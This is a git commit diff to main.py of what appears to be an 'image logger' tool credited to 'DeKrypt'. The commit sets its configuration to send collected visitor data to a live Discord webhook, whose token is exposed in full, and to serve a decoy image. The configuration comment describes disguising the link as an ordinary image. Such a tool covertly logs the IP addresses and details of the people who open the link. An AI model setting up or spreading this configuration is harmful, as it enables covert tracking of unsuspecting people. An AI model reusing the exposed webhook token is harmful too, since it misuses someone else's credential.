8e8cbd7e8d5d7bc3e47d9bedcd69e4cb058898e1
lygthth <165331864+lygthth@users.noreply.github.com>
2024-06-04 18:37:11 -0700

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1247722635614359594/6W6hhxqwKiwx22qjM1rxCalbB77f72cUrWgQZnRKGYt7w9FPq0P2ivKfKqidWjwmaKIc",
+    "image": "https://cdn.clickworker.com/wp-content/uploads/2022/09/BenefitsofAI.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
